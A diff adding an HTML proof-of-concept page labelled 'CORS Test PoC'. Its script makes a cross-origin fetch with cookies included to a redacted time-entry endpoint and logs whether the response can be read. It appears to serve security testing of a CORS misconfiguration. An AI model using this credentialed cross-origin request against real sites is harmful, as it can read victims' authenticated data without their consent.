@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>CORS Test PoC</h1>
+<script>
+// Target endpoint
+const url = "http://xxxxxxxxxxx/neptune/zmfp_time_entry_v2?ajax_id=SAVE_TEMPLATE&ajax_applid=.......................................";
+fetch(url, {
+  credentials: "include"  // Include cookies/session
+})
+.then(r => r.text())
+.then(d => console.log("DATA RECEIVED:", d))
+.catch(e => console.error("BLOCKED:", e));
+</script>
+</body>
+</html>
